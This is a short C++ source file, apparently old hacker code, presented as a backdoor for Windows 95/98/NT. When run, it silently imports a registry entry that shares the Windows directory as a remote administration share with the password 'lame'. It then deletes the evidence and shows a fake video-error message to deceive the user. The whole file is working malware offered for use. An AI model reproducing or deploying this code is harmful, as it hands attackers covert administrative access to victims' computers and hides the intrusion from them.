/* lame.cpp by wizdumb@leet.org
 *
 * Simple backdoor proggy for windoze 95/98/NT4 - enables remote
 * administration with "lame" as password. I would do this with the proper
 * API for registry access, but I'm too lazy to learn it, and this works, and
 * is smaller, so what the fuck. ;-)
 *
 * Haven't tested this on Windows 2000, but fortunately enough, Win2k has
 * remote administration enabled by default with no password. ;-P
 */

#include <fstream.h>
#include <stdlib.h>

void main() {
  ofstream fout("c:\\windows\\system\\lame.reg");
  fout << "REGEDIT4\n";
  fout << "[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\\ADMIN$]\n";
  fout << "\"Flags\"=dword:00000302\n";
  fout << "\"Type\"=dword:00000000\n";
  fout << "\"Path\"=\"C:\\WINDOWS\"\n";
  fout << "\"Parm2enc\"=hex:\n";
  fout << "\"Parm1enc\"=hex:79,db,00,e3\n";
  fout << "\"Remark\"=\"Lame Lame Lame\"\n";
  fout.close();
  system("regedit /s c:\\windows\\system\\lame.reg");
  system("del c:\\windows\\system\\lame.reg");
  system("cls");
  cout << "Couldn't initialise video. Bailing out...\n";
}